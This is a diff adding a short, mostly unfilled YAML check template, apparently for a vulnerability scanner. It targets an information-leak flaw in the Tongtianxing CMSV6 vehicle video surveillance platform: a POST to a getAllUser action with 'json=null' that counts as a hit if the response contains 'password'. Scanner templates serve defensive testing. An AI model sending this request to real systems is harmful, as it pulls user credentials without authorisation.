@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 通天星CMSV6车载视频监控平台信息泄露
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /808gps/StandardLoginAction_getAllUser.action
+  headers:
+  data: |
+    json=null
+response1:
+  body: password
+  code: 200
+requests2:
+response2:
